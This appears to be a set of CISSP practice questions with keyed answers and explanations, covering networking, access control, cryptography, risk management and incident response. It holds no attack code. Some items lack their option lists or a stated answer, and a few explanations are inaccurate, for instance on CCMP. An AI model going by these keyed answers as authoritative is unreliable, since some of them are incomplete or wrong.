<p>Write blocker</p> <p>Write blockers are hardware devices used to prevent the accidental writing of data to media that was collected as evidence. Network taps and protocol analyzers are used in the collection of evidence from networks, rather than storage. Cryptographic hashes may be used to detect unauthorized changes to evidence, but they do not prevent those changes from occurring.</p> </li> <li> <p>Gene is reviewing the shared software libraries used within his organization. He notices that developers widely use open source libraries. Which of the following statements about these libraries are true? (Select all that apply)</p> <p>Open-source libraries should be tested for security vulnerabilities.</p> <p>Open-source library use within the organization should be tracked.</p> <p>Open-source libraries are commonly used by software developers and do not necessarily pose a higher risk than commercially available libraries. The use of these libraries should be tracked and subject to regular security testing, as should any other closed-source library use.</p> </li> <li> <p>What test coverage analysis technique verifies that every if statement in the code has been executed under all if and else conditions?</p> <p>Branch coverage</p> <p>Branch coverage evaluates whether every if statement has been executed under all if and else conditions. Condition coverage tests whether every logical test in the code has been executed under all sets of input. Function coverage verifies that every function in the code has been called and returned results. Loop coverage verifies that every loop in the code has been executed under conditions that cause code execution multiple times, only once, and not at all.</p> </li> <li> <p>What is a hardware-imposed network segmentation that requires a routing function to support intersegment communications otherwise known as?</p> <p>VLAN</p> <p>A VLAN (virtual LAN) is a hardware-imposed network segmentation created by switches that requires a routing function to support communication between different segments. A subnet is defined by IP address and subnet mask assignment. Subnets are not defined by routers, but subnets do require a routing function to support intersegment communications. An internal segmentation firewall (ISFW) is not the name of a network segment, but it can be used to create network segments by dividing subnets. An extranet is a type of screened subnet typically separated from the intranet and internet by firewalls.</p> </li> <li> <p>Which of the following statements are true in regard to NAC (Network access control)?</p> <p>Agent-based NACs can quarantine noncompliant devices and implement updates automatically.</p> <p>Preadmission-based NAC requires a system to meet all current security requirements (such as patch application and malware scanner updates) before it is allowed to communicate with the network.</p> <p>A dissolvable NAC agent can be set to run once and then terminate. </p> <p>An agentless NAC performs port scans, service queries, and vulnerability scans against networked systems to determine whether devices are authorized and baseline compliant. </p> <p>Revise other incorrect answers:</p> <p>An agentless NAC is unable to automatically quarantine and resolve security issues on hosts. An agentless system requires an administrator to manually resolve any discovered issues.</p> <p>IEEE 802.1X can be used by a NAC solution as a means to grant or deny network access based on authentication, but NAC does not require the use of IEEE 802.1X.</p> </li> <li> <p>Your CISO is implementing a new technology to enable the various satellite offices to be connected to the central headquarters. This will increase business operations efficiency as well as allow for a more consistent application of company security policy. The technology is based on an encapsulation protocol that enables switch-created network segments to be stretched across subnets and geographic distances. What technology is being implemented in this scenario?</p> <p>VXLAN</p> <p>Virtual eXtensible LAN (VXLAN) is an encapsulation protocol that enables switch-created network segments (i.e., VLANs) to be stretched across subnets and geographic distances. Software-defined wide-area networks (SDWANs or SD-WANs) is an evolution of SDN that can be used to manage the connectivity and control services between distant data centers, remote locations, and cloud services over WAN links. SDN (Software Defined Network) offers a new network design that is directly programmable from a central location, flexible, vendor neutral, and open standards based. A VPN is a secured encapsulation tunnel used to connect networks (or network segments) together.</p> </li> <li> <p>A mission-critical server has experienced a compromise that caused it to go offline for seven hours. This nearly caused the organization to go out of business. After the attack, investigations revealed malicious code that would have corrupted the core database, but it was coded poorly and did not execute. This incident has caused the organization to rethink their security precautions against compromise, downtime, and disaster events. In order to prevent future downtime or at least reduce it significantly, which of the following technologies should be deployed? (Choose all that apply.)</p> <p>B. RAID</p> <p>C. UPS</p> <p>D. Dual power supplies</p> <p>E. Offsite backups of system images and snapshots</p> <p>H. Replication</p> <p>I. Clustering</p> <p>For this scenario, many different redundancy, resiliency, or uptime management options should be considered. This includes option B: Redundant array of inexpensive disks (RAID) to maintain data availability; option C: Uninterruptible power supply (UPS) to protect against power issues; option D: Dual power supplies to provide redundancy against power supply failures; option E: Offsite backups to provide a recovery path in the event of a major disaster\u2019 option H: Replication to ensure multiple similar servers are hosting cloned material so that no matter which server is accessed the most current version of data is available; and option I: Clustering that is used to operate numerous servers as a collective to support a single or primary resource and provide high availability. The following options are incorrect for this scenario: option A: Full-disk encryption (FDE), though a good security practice, is not related to redundancy, resiliency, or uptime management; option F: Multifactor authentication (MFA), though a good security practice, is not related to redundancy, resiliency, or uptime management; and option G: Security information and event management (SIEM) is a centralized application to automate the monitoring of network systems, which a good security practice, but is not related to redundancy, resiliency, or uptime management.</p> </li> <li> <p>An organization\u2019s security policy allows users to connect their mobile devices to the internal network. However, it requires that their devices are up-to-date with a current operating system. Which of the following access control models can enforce this requirement?</p> <p>Attribute-Based Access Control (ABAC)</p> <p>An ABAC model can require user devices to meet specific requirements, such as being up-to-date with a current operating system. A rule-based access control model defines access using a set of rules, such as the rules in a firewall\u2019s access control list. A MAC model uses matching labels to grant access. An RBAC model uses job roles, or groups, for access control.</p> </li> <li> <p>Tina is selecting a cryptographic algorithm that will be used in a parallelized environment to distribute the workload of encryption and decryption among multiple processors. What cryptographic mode would best support this computing model?</p> <p>Counter</p> <p>Counter mode allows you to break an encryption or decryption operation into multiple independent steps. This makes Counter mode well suited for use in parallel computing.</p> </li> <li> <p>Which of the following statements are not true in regard to static electricity?</p> <p>A. Electrostatic discharge can damage most computing components. (True)</p> <p>B. Static charge accumulation is more prevalent when there is ~~high~~ (low) humidity. (False. Low humidity)</p> <p>C. Static discharge from a person to a metal object can be over 1,000 volts. (True)</p> <p>D. Static electricity is not managed by the deployment of a UPS. (True)</p> </li> <li> <p>An organization has recently implemented an asset management program. Which of the following BEST represents the primary goal of this program?</p> <p>Prevent losses</p> </li> <li> <p>Which of the following is an advantage of a single sign-on (SSO) solution within an internal network?</p> <p>It improves the administrator\u2019s ability to manage user accounts.</p> <p>SSO solutions and centralized administration and make it easier for administrators to manage user accounts. SSO solutions can be a single point of failure, but this is a vulnerability. Another vulnerability is that compromise of a single account can give an attacker access to multiple resources. Although SSO solutions typically can support more than one operating system, it isn\u2019t always easy to support all operating systems in internal networks.</p> </li> <li> <p>Which of the following is not an element defined under the Clark\u2013Wilson model? </p> <p>Redundant commit statement (not an element of the Clark\u2013Wilson model, it is instead an element in database replication.)</p> <p>The Clark\u2013Wilson model does define the constrained data item, transformation procedures, and integrity verification procedure.</p> </li> <li> <p>An organization has merged with another organization. The two organizations are using different network operating systems. Management wants to implement a solution that will give them the most control while allowing both organizations to access resources in both networks. Which of the following choices is the best to meet these needs?</p> <p>On-premises identity management</p> <p>An on-premises identity management system will provide the organization with the most control and is the best choice. A cloud-based solution is controlled by a third party. There\u2019s no need to have both an on-premises and a cloud-based solution in this situation, which would be a hybrid solution. Identity management solutions provide single sign-on (SSO), but SSO is a benefit of identity management, not a type of identity management.</p> </li> <li> <p>When you install a new wireless access point to extend your company\u2019s network into a newly opened portion of the building, someone raises the concern of interference between the existing Wi-Fi network and the new extension. What media access technology is used by 802.11 networks to manage collisions?</p> <p>CSMA/CA</p> <p>IEEE 802.11 wireless networks use Carrier-Sense Multiple Access with Collision Avoidance (CSMA/CA) to manage (technically avoid) collisions. Ethernet (IEEE 802.3) uses Carrier-Sense Multiple Access with Collision Detection (CSMA/CD). Token Ring networks used token passing. Polling is used by some mainframe systems.</p> </li> <li> <p>Which one of the following disaster types is not usually covered by standard business insurance?</p> <p>Flood</p> <p>Most general business insurance and homeowner\u2019s insurance policies do not provide any protection against the risk of flooding or flash floods. If floods pose a risk to your organization, you should consider purchasing supplemental flood insurance under FEMA\u2019s National Flood Insurance Program.</p> </li> <li> <p>Security administrators recently detected an attack that allowed attackers to exfiltrate data from several servers. They implemented the incident response plan on response. Which of the following would security personnel do during the remediation stage of incident management?</p> <p>Root cause analysis</p> <p>Security personnel perform a root cause analysis during the remediation stage. A root cause analysis attempts to discover the source of the problem. After discovering the cause, the review will often identify a solution to help prevent a similar occurrence in the future. Containing the incident and collecting evidence is done early in the incident management process. Rebuilding a system may be needed during the recovery stage.</p> </li> <li> <p>Temporary internet files or the internet files cache is the temporary storage of files downloaded from internet sites that are being held by the client\u2019s utility (typically a browser) for current and possibly future use. What type of attack is possible if an adversary is able to gain access to this cache? (Choose all that apply.)</p> <p>Split-response attack</p> <p>Cache poisoning</p> <p>DOM XSS</p> <p>The temporary internet files cache if accessed by an adversary could result in a split-response attack, cache poisoning, and/or DOM XSS. Split-response attacks can cause the client to download content and store it in the cache that was not an intended element of a requested web page. Once files have been poisoned in the cache, then even when a legitimate web document calls on a cached item, the malicious item will be activated. DOM XSS may be able to access and use locally cached files to execute malicious code or exfiltrate data. Internet files cache access will not likely result in identity theft. Identity theft is the act of stealing someone\u2019s identity. Cache access might allow for some forms of spoofing, masquerading, or impersonation of websites, but it is unlikely to contain enough information about the person using the system to be able to perform actual identity theft.</p> </li> <li> <p>A web developer implemented an authentication solution on a website allowing users to authenticate with a third party. The website doesn\u2019t see or store the user\u2019s credentials. The solution uses technologies described in RFC 6749 but is not maintained by IETF. What does this describe?</p> <p>OpenID Connect (OIDC) uses the OAuth framework (described in RFC 6749) and is maintained by the OpenID Foundation. RFC 6749 describes OAuth and is maintained by the Internet Engineering Task Force (IETF). </p> </li> <li> <p>Which backup facility is large enough to support current operational capacity and load but lacks the supportive infrastructure?</p> <p>Cold site</p> </li> <li> <p>Proximity devices can be used to control physical access. The proximity device is worn or held by the authorized bearer. When it passes near a proximity reader, the reader device is able to determine who the bearer is and whether they have authorized access. Which of the following is a proximity technology that is the equivalent of RFID?</p> <p>Field-powered proximity device</p> <p>RFID (radio-frequency identification) is effectively a field-powered proximity device. A passive proximity device is often a magnet; an RFID does not use a magnet, but an antenna to generate current from a magnet field provided by an external source. A self-powered proximity device has its own battery, which RFID does not, but NFC may. A TOTP token is a device with an LCD screen that displays a one-time use password that is based on time and that changes at fixed time intervals. There is no such thing as a TOTP proximity token.</p> </li> <li> <p>You need to run networking cables between two office buildings. Between the buildings are several electrical boxes that manage the primary power for the entire business park. Which of the following cable is the worst option to use?</p> <p>UTP</p> <p>UTP is the least resistant to EMI because it is unshielded. STP is a shielded form of twisted pair that resists EMI. Fiber is not affected by terrestrial EMI. Wireless is not a cable, but it could be affected by EMI if the interference occurred in the wireless transmission frequencies.</p> </li> <li> <p>Developers of a web application want to ensure that users are logged off automatically after 20 minutes of inactivity. Which of the following choices indicates the easiest way to do this?</p> <p>A web development framework</p> <p>The easiest way (and the best way) to implement session management is with a web development framework, such as one recommended by the Open Web Application Security Project (OWASP). Writing the code from scratch in Python or JavaScript would not be the easiest way and may introduce vulnerabilities, whereas established frameworks are reliable and well tested. TLS should be used in session management, but TLS doesn\u2019t close sessions.</p> </li> <li> <p>You have three applications running on a dual-core single-processor system that supports multitasking. One of those applications is a word processing program that is managing two threads simultaneously. The other two applications are using only one thread of execution. How many application threads are running on the processor at any given time?</p> <p>Two</p> <p>A dual-core single-processor system can operate on two threads at a time (one by each core). There would be a total of four application threads in this scenario (ignoring any threads created by the OS), but the OS would be responsible for deciding which single thread is running on the processor at any given time. A single-core single processor system would be limited to one thread executing at a time. Other multicore and/or multiprocessor configurations would be needed to execute three or four (or more) threads simultaneously.</p> </li> <li> <p>Under what method are database backups bulk transferred to off-site recovery locations?</p> <p>Electronic vaulting</p> <p>Electronic vaulting automatically backs up data to a secure site where storage professionals at the vaulting company\u2019s site handle the details.</p> </li> <li> <p>Security administrators are considering different configuration management methods. Which of the following is the MOST effective method of configuration management provisioning?</p> <p>Using images</p> <p>Images are an effective provisioning method that ensures systems receive an initial, known baseline configuration. Change management processes help prevent outages from unauthorized changes. Vulnerability management processes help to identify vulnerabilities, and patch management processes help to ensure that systems are kept up-to-date.</p> </li> <li> <p>A company has not been implementing patches consistently, and you are tasked with writing a policy related to patch management. Which of the following should you include in the policy? (Choose three.)</p> <p>A. Evaluate patches.</p> <p>B. Test patches.</p> <p>D. Audit patches.</p> <p>A patch management process includes evaluating patches, testing patches, and auditing patches. Evaluating patches determines what patches should be deployed. Testing helps discover unintended problems before they are deployed. Auditing ensures required patches have been deployed. All patches should not be deployed. Instead, only patches that apply to a system and have been approved should be applied.</p> </li> <li> <p>The ______ data model has data stored in more than one database, but the data is still logically connected. The user perceives the database as a single entity, even though it comprises numerous parts interconnected over a network.</p> <p>Distributed</p> <p>The distributed data model has data stored in more than one database, but the data is still logically connected. The user perceives the database as a single entity, even though it comprises numerous parts interconnected over a network.</p> </li> <li> <p>Internet Protocol Security (IPsec) is a standard of IP security extensions used as an add-on for IPv4 and integrated into IPv6. IPsec isn\u2019t a single protocol but rather a collection of protocols. Which component of IPsec enables multiple simultaneous VPNs?</p> <p>ISAKMP</p> <p>Internet Security Association and Key Management Protocol (ISAKMP), an element of Internet Key Exchange (IKE), is used to organize and manage the encryption keys that have been generated and exchanged by OAKLEY and SKEME. A security association is the agreed-on method of authentication and encryption used by two entities (a bit like a digital keyring). ISAKMPs\u2019 use of security associations is what enables IPsec to support multiple simultaneous VPNs from each host. Encapsulating Security Payload (ESP) provides confidentiality and integrity of packet contents. ESP provides encryption and limited authentication, and prevents replay attacks. Secure Key Exchange Mechanism (SKEME), an element of Internet Key Exchange (IKE), is a means of exchanging keys securely. Authentication Header (AH) provides assurances of message integrity and nonrepudiation. AH also provides authentication and access control, and prevents replay attacks.</p> </li> <li> <p>You\u2019re working for a financial institution that has job rotation and separation of duties policies. What is a primary benefit of these policies?</p> <p>Preventing fraud</p> <p>Job rotation and separation of duties policies help prevent fraud. Collusion is an agreement among multiple persons to perform some unauthorized or illegal actions, and implementing these policies doesn't prevent collusion, nor does it encourage employees to collude against an organization. They help deter and prevent incidents, but they do not correct them.</p> </li> <li> <p>A recent update to networking equipment has provided the IT management and security teams with many new capabilities. These include the ability to implement customized network segments and use NATing between them. Which of the following is an appropriate container where static NAT can be used to grant external entities access to resources that are otherwise using private IP addresses? (Choose all that apply.)</p> <p>Screened subnet</p> <p>Extranet</p> <p>Static NAT can be appropriately and securely used to grant external entities access to resources positioned in a screened subnet or an extranet, especially when those resource hosts are using private IP addresses. VLANs are typically not relevant to NAT because NAT operates at layers 3 and 4 and a VLAN exists at layer 2. It is not appropriate or secure to use static NAT to grant external entities access into the LAN.</p> </li> <li> <p>A cloud application has been deployed and shared among several organisations with similar concerns. What type of cloud-based deployment model does this describe?</p> <p>Community</p> <p>A community cloud deployment model provides cloud-based assets to two or more organizations. A public cloud model includes assets available for any consumers to rent or lease. A private cloud deployment model includes cloud-based assets that are exclusive to a single organization. A hybrid model includes a combination of two or more deployment models. It doesn't matter if it is a Software as a Service (SaaS) model or any other service model.</p> </li> <li> <p>A user is attempting to access a website, but when they type the FQDN into the address bar of their browser, a different site appears. The user opens a command prompt and performs an nslookup query to obtain the IP address their system is receiving when resolving the FQDN of the website. The user then checks with a colleague who is working from home and they get a different IP address and they have no issue accessing the website. The user checks their IP configuration and sees that the correct DNS server is listed as their query target. The user runs ipconfig /flushdns and then the ipconfig /displaydns commands but does not see the correct website\u2019s identity listed in the final result. Which of the following is the most likely cause for this situation?</p> <p>Local DNS caching server poisoning</p> <p>The most likely cause of this situation is the poisoning of the local DNS caching server. This is the DNS server that the user\u2019s computer is using to send DNS queries to. When the user types in the fully qualified domain name (FQDN), the resolution returns the wrong IP address. The investigations performed by the user demonstrated that this is the only remaining option. After a DNS flush, the display command would have shown the FQDN and the wrong IP address if the hosts file had been modified since those entries would not be removed from the DNS cache as they are boot persistent. When their local IP configuration is correct, it shows that DHCP was not altered to hand out an invalid DNS server IP address. Since their colleague had no issue getting to the correct website, the authoritative DNS server\u2019s zone file was not modified.</p> </li> <li> <p>A DCE typically includes an interface definition language (IDL). An IDL is a language used to define the interface between client and server processes or objects in a distributed system. Which of the following are considered examples of DCE IDL? (Choose all that apply.)</p> <p>RPC</p> <p>CORBA (Common Object Request Broker Architecture)</p> <p>DCOM (Distributed Component Object Model)</p> <p>There are numerous examples DCE IDL or frameworks, such as remote procedure calls (RPC), the Common Object Request Broker Architecture (CORBA), and the Distributed Component Object Model (DCOM). The other options are incorrect. Security Assertion Markup Language (SAML) is used for authentication federation. Online Certificate Status Protocol (OCSP) is used to check on the revocation status of a certificate. Structured Query Language (SQL) is a means to interact with a database management system and its hosted databases.</p> </li> <li> <p>Applications developed on ____ are similar to microservices, and each function is crafted to operate independently and autonomously. This allows each function to be independently scaled by the CSP. With this technology, the functions run only when called and then terminate when their operations are completed.</p> <p>Serverless architecture</p> <p>Applications developed on serverless architecture are similar to microservices, and each function is crafted to operate independently and autonomously. This allows each function to be independently scaled by the CSP. With this technology, the functions run only when called and then terminate when their operations are completed. The other options are incorrect. JavaScript is the most widely used scripting language in the world and is embedded into HTML documents using \u02c2script\u02c3\u02c2/script\u02c3 enclosure tags. In asymmetric multiprocessing (AMP), the processors are often operating independently of one another. Usually, each processor has its own OS and/or task instruction set. Smart devices are a range of devices that offer the user a plethora of customization options, typically through installing apps, and may take advantage of on-device or in-the-cloud machine learning (ML) processing.</p> </li> <li> <p>Which of the following are examples of risk management frameworks? (Choose all that apply.)</p> <p>There are six actual risk management frameworks included in this list of options. They are:  (A) Risk Management Framework (RMF) defined by NIST,  (C) The Committee of Sponsoring Organizations (COSO) of the Treadway Commission\u2019s Enterprise Risk Management \u2014 Integrated Framework,  (D) ISACA\u2019s Risk IT Framework,  (F) Operationally Critical Threat, Asset, And Vulnerability Evaluation (OCTAVE),  (H) Factor Analysis of Information Risk (FAIR), and  (I) Threat Agent Risk Assessment (TARA). </p> <p>The other options listed are not risk management frameworks. The incorrect answers are: (B) CCMP (Counter Mode Cipher Block Chaining Message Authentication Code Protocol) is the streaming cipher variation of block ciphers, such as AES, (E) EC Council (ECC)\u2019s Certified Ethical Hacker (CEH) is a certification focusing on penetration testing, (G) annualized rate of occurrence (ARO) is an element used in quantitative risk analysis, and (J) The National Institute of Standards and Technology (NIST) is an agency of the U.S. government that establishes security standards, including the RMF.</p> </li> <li> <p>You notice a message on your system that asks you to visit a web URL in order to confirm your identity. You don\u2019t recognize the site. You also realize that the message seems to be handled by your Bluetooth subsystem. You think you have been the victim of bluejacking. What was compromised?</p> <p>Your cell phone</p> <p>This scenario is describing a bluejacking attack. A bluejacking attack is a wireless attack on Bluetooth, and the most common device compromised in a bluejacking attack is a cell phone. Firewalls and switches do not usually support Bluetooth; therefore, they are not subject to bluejacking attacks. Although the bluejacking attack included an inducement to visit a web URL to confirm identity, the scenario does not indicate that the URL was visited or that the requested information was provided. Thus, there is no evidence that your account was compromised.</p> </li> <li> <p>A technician came across a collection of DVDs. Some appear to be blank, but others have data written to them and the classification of the data isn\u2019t clear. A supervisor tells the technician to dispose of them. Which of the following methods would be the most secure method of disposing of the DVDs?</p> <p>Destroying them in an incinerator</p> <p>Physical destruction is the most secure method of deleting data on optical media such as a DVD. Formatting and deleting processes rarely remove the data from any media. DVDs do not have magnetic flux, so degaussing a DVD doesn\u2019t destroy data.</p> </li> <li> <p>Tom built a database table consisting of the names, telephone numbers, and customer IDs for his business. The table contains information on 30 customers. What is the cardinality of this table?</p> <p>Thirty</p> <p>The cardinality of a table refers to the number of rows in the table, whereas the degree of a table is the number of columns.</p> </li> <li> <p>Which of the following is not related to verifying that a candidate for employment is qualified as well as not disqualified for a position?</p> <p>Signing an NDA</p> <p>Signing an NDA (non-disclosure agreement) may be a part of the hiring process, but it is not related to verifying that a candidate for employment is qualified as well as not disqualified for a position. Employment candidate screening, background checks, reference checks, education verification, and security clearance validation are essential elements in proving that a candidate is adequate, qualified, and trustworthy for a secured position.</p> </li> <li> <p>A divestiture or any form of asset or employee reduction is another time period of increased risk and thus increased need for focused security governance. Which of the following are security processes that should be implemented to reduce the risk associated with a divestiture event? (Choose all that apply.)</p> <p>Sanitize assets.</p> <p>Storage media should be removed and destroyed.</p> <p>Employees released from duty need to be debriefed.</p> <p>A divestiture occurs when something is being removed from the organization, whether a device, service, employee, or partnership. Security processes should be implemented at these times to reduce the risk of data loss and leakage, such as sanitizing assets, remove and destroy storage media, and debrief ex-employees. What is not needed is to update the firmware of, renew system certificates for, or propose feature improvements for devices being disposed of.</p> </li> <li> <p>Sharif is preparing an audit report after completing an SSAE 18 engagement. His report offers an opinion on the controls described by management and the results of his testing of the effectiveness of those controls over the last year. What type report is he preparing?</p> <p>Type II</p> <p>Type I reports provide the auditor\u2019s opinion on the description of controls provided by management and the suitability of the design of those controls. Type II reports go further and also provide the auditor\u2019s opinion on the operating effectiveness of the controls over an extended period of time. Type III and IV reports do not exist under SSAE 18.</p> </li> <li> <p>Kaitlyn is concerned about the security of data users are retrieving from a website and would like to apply an appropriate cryptographic solution. What type of use case is she attempting to secure?</p> <p>Data in motion</p> <p>Kaitlyn is specifically concerned about information that users are retrieving. Therefore, she is considering a data in motion use case.</p> </li> <li> <p>Kelly is reviewing privileged accounts and would like to ensure that each account was appropriately authorized. What process should she verify?</p> <p>Management review and approval</p> <p>The management review and approval process ensures that each account was appropriately authorized and remains necessary to meet business needs.</p> </li> <li> <p>Your organization works with several third-party suppliers for a wide range of services, including accounting, payroll, benefits management, help desk, incident response, log analysis, and more. The CEO has recently complained that the organization is likely wasting money due to paying for the same services from multiple providers and not taking full advantage of the services from those providers and still performing some of those tasks in-house. In order to gain a better understanding of the outsourced services as well as improve ordering convenience, manage related training, and consolidate billing, which of the following should be implemented?</p> <p>VMS</p> <p>This scenario describes a situation that would benefit from a vendor management system (VMS). VMS is a software solution that assists with the management and procurement of staffing services, hardware, software, and other needed products and services. A VMS can offer ordering convenience, order distribution, order training, consolidated billing, and more. The other three options do not apply to this scenario since they are not a means to view, manage, or optimize the relationship between an organization and third-party suppliers. Security information and event management (SIEM) can be used to aggregate data sources, such as log files, perform real-time network traffic capture, and perform data analytics to provide near-real-time alerts and reports on security issues and incidents. A service-level requirement (SLR) is a statement of the expectations of service and performance from the product or service of a vendor. This is the wrong tool in this scenario since existing vendor services need to be managed and a new relationship with another vendor is not being established. A business partners agreement (BPA) is a contract between two entities dictating the terms of their business relationship. It clearly defines the expectations and obligations of each partner in the endeavor. A BPA is the closest but still an incorrect option, since it focuses on the business partner relationship rather than that of a customer to a vendor.</p> </li> <li> <p>There\u2019s an almost infinite possibility of threats, so it\u2019s important to use a structured approach to accurately identify relevant threats. What are the common examples of threat modeling approaches? (Choose all that apply.)</p> <p>Focus on attackers</p> <p>Focus on assets</p> <p>Focus on software</p> <p>The three common threat modeling approaches from this list of options are focus on attackers, focus on assets, and focus on software. Focus on insiders and focus on stakeholders may have some benefit for threat evaluation, but they are not widely recognized as common approaches to threat modeling.</p> </li> <li> <p>When conducting an internal investigation, what is the most common source of evidence?</p> <p>Voluntary surrender</p> <p>Internal investigations usually operate under the authority of senior managers, who grant access (i.e., voluntary surrender) to all information and resources necessary to conduct the investigation.</p> </li> <li> <p>Charlie is seeking a common naming scheme that he can use to describe system configurations during vulnerability analysis. Which one of the following SCAP components would be best suited to this task?</p> <p>CCE</p> <p>Common Configuration Enumeration (CCE) provides a naming system for system configuration issues. Common Vulnerabilities and Exposures (CVE) provides a naming system for describing security vulnerabilities. Common Platform Enumeration (CPE) provides a naming system for operating systems, applications, and devices. The Common Vulnerability Scoring System (CVSS) provides a standardized scoring system for describing the severity of security vulnerabilities.</p> </li> <li> <p>Which of the following is the best response after detecting, verifying, and responding to an incident?</p> <p>Contain it.</p> <p>Mitigation is the next step after detecting, verifying, and responding to an incident, and responders attempt to contain the incident in the mitigation step. This limits the effect or scope of an incident. Organizations report the incident based on policies and governing laws, but this is not the first step. Remediation attempts to identify the cause of the incident and steps that can be taken to prevent a reoccurrence. It is important to protect evidence while trying to contain an incident, but gathering the evidence will occur after containment.</p> </li> <li> <p>A new intern has been hired to provide assistance to the security team. The intern is not as familiar with enterprise network concepts as the CISO would like. The CISO is gathering some facts that they want the intern to learn. But the CISO needs to confirm that they are providing only true statements. Which of the following statements is not true?</p> <p>A subnet is created by a router. (False)</p> <p>A subnet is not created by a router; a subnet is created through the assignment of an IP address and a subnet mask. Routers only manage traffic between subnets. The other statements are true. VLANs are created by switches. Multilayer switches can allow cross-VLAN communications by providing a routing function. VLANs contain or restrict traffic by default.</p> </li> <li> <p>The risk management team has been diligently assessing risk and selecting appropriate response. Only a few unresolved issues remain, but they are still above the risk acceptance threshold. A member of the team recommends insurance to cover the loss potential. The purchasing of insurance is a form of _______.</p> <p>Risk assignment</p> <p>Insurance is a form of risk assignment or transference. (A) Reducing risk, or risk mitigation, is the implementation of safeguards, security controls, and countermeasures to reduce and/or eliminate vulnerabilities or block threats. (C) Accepting risk or acceptance of risk is the result after a cost/benefit analysis shows that countermeasure costs would outweigh the possible cost of loss due to a risk. (D) An unacceptable possible response to risk is to reject risk or ignore risk. Denying that a risk exists and hoping that it will never be realized are not valid or prudent due care/due diligence responses to risk.</p> </li> <li> <p>Which of the following best describes the tailoring process?</p> <p>Assigning different values for a control</p> <p>The tailoring process refers to modifying a list of controls to align with the organization\u2019s mission. One way it does so is by modifying control parameters, such as changing the account lockout threshold. Scoping is specifically used to remove controls from a suggested baseline. While tailoring includes scoping, assigning different values for controls only apples to tailoring. Tailoring is done after selecting a baseline. Tailoring doesn\u2019t include creating an image.</p> </li> <li> <p>Your company\u2019s data policy identifies several data roles and their responsibilities. It mentions the data custodian. Which of the following tasks would the data custodian be responsible for completing?</p> <p>Backing up data</p> <p>The data custodian is responsible for day-to-day tasks to protect data, such as backing up data. Data owners have the ultimate responsibility for protecting data, and they identify the classification of data. A data processor controls the processing of the data, based on what the data controller tells them. A data controller decides what data to process and how to process it.</p> </li> <li> <p>What is the concept of a computer implemented as part of a larger system that is typically designed around a limited set of specific functions (such as management, monitoring, and control) in relation to the larger product of which it\u2019s a component?</p> <p>Embedded system</p> <p>An embedded system is a computer implemented as part of a larger system. The embedded system is typically designed around a limited set of specific functions in relation to the larger product of which it\u2019s a component. It may consist of the same components found in a typical computer system, or it may be a microcontroller. The Internet of Things (IoT) is a class of smart devices that are internet-connected in order to provide automation, remote control, or AI processing to appliances or devices. A microservice is simply one element, feature, capability, business logic, or function of a web application that can be called on or used by other web applications. It is a software concept, not a hardware device. A system on a chip (SoC) is an integrated circuit (IC) or chip that has all of the elements of a computer integrated into a single chip. An SoC may be the main component of a microcontroller that is used to control or manage another system. An SoC is not considered an embedded device.</p> </li> <li> <p>An invitation-only VoIP call among the members of the board of directors took place last month. You just received notice that a partial recording of that call was found on a hacker discussion forum. After investigating the breach, you discover that your VoIP solution was the focus of the security breach and someone was able to eavesdrop on the conversation midstream. Which of the following would be the best option to prevent this incident from reoccurring?</p> <p>SRTP</p> <p>Implementing Secure Real-time Transport Protocol (SRTP) is the best option to secure VoIP and prevent the reoccurrence of the eavesdropping attack. Most likely the VoIP service used for the call last month was using plaintext RTP. Note that VoIP recording can still occur at the endpoints even if SRTP or other communication encryption is in use. Multimedia collaboration is not likely to be a security improvement over the existing solution. Adding other features, such as video and whiteboard sharing, would not address the problem. Direct inward system access (DISA) is a security solution for PBX, not VoIP. Domain Message Authentication Reporting and Conformance (DMARC) is a DNS- based email authentication system, not a VoIP security solution.</p> </li> <li> <p>An organization has decided to outsource the management of its benefit plans. Management wants to minimize the administrative workload when implementing this. Which of the following solutions would meet this need?</p> <p>Use just-in-time provisioning.</p> <p>Just-in-time (JIT) provisioning will create the accounts automatically the first time the employee accesses the benefits site. The other solutions require much more administrator work. Sending a database of accounts requires administrators to export the accounts, and the other company to import them. Duplicating the accounts internally won\u2019t grant them access to the other site. Creating a trust also won\u2019t grant employees access to the other site.</p> </li> <li> <p>Carla\u2019s organization recently suffered a security incident where the attackers exploited a SQL injection vulnerability. As she reviewed the situation, she determined that the organization\u2019s incident response process was lacking maturity. What business function should she focus on under the Software Assurance Maturity Model (SAMM)?</p> <p>Operations</p> <p>Incident management, detection, and response are all security practices under the Operations business function in the Software Assurance Maturity Model.</p> </li> <li> <p>Which of the following are true? (Choose all that apply.)</p> <p>A purely quantitative analysis is not possible.</p> <p>Quantitative risk analysis assigns real dollar figures to the loss of an asset.</p> <p>Qualitative risk analysis assigns subjective and intangible values to the loss of an asset.</p> <p>Three of these statements are true. (A) A purely quantitative analysis is not possible; (C) Quantitative risk analysis assigns real dollar figures to the loss of an asset; and (D) Qualitative risk analysis assigns subjective and intangible values to the loss of an asset. The other statement is false. Its corrected version is (B) Qualitative risk analysis does not employ complex formulas and calculations. Scenario discussions and simple value assignments are used to evaluate risk, incidents, losses, and safeguards in a qualitative risk assessment.</p> </li> <li> <p>An organization provides online training to employees of multiple organizations. Employees log on normally, and they can then access the training website without logging on again. Which of the following best identifies the system the training company is using?</p> <p>Cloud-based identity management</p> <p>The training company is most likely using a cloud-based identity management system. On-premises identity management systems are used when users are from the same organization, not multiple different organizations. Hybrid solutions implement both an on-premises and a cloud-based solution, but both are not needed in this scenario. A credential management system provides storage space for credentials.</p> </li> <li> <p>In object-oriented programming, what term describes a collection of the common methods from a set of objects that defines the behavior of those objects?</p> <p>Class</p> <p>A class is a collection of the common methods from a set of objects that defines the behavior of those objects.</p> </li> <li> <p>Your organization is redesigning its IT infrastructure to increase ease of management and add new capabilities. The leadership has issued a mandate that a SAN solution is needed and that all landline-based telephone services are to be removed. The mandate also indicates that replacement solutions should integrate into the overall IT environment seamlessly. Which of the following technologies would be worth considering in this scenario? (Choose all that apply.)</p> <p>A. iSCSI: Internet Small Computer System Interface, an IP-based storage networking protocol developed by the Internet Engineering Task Force (IETF) to link data storage facilities.</p> <p>B. VoIP: Voice over Internet Protocol and is a technology that allows voice and multimedia communication over the internet.</p> <p>C. FCoE: Fibre Channel over Ethernet (FcoE) is a storage protocol that enables Fibre Channel (FC) communications to run directly over Ethernet.</p> <p>VoIP, iSCSI and FCoE are converged protocols, which provide for a SAN (Storage Area Network) and voice communication services. Trivial File Transfer Protocol (TFTP) is not an example of a converged protocol, nor is it relevant to this scenario.</p> </li> </ol>"}, {"location": "CISSP%20Pre/1-Security%20and%20Risk%20Management/0-Overview/", "title": "Domain 1 Security and Risk Managment 16%", "text": ""}, {"location": 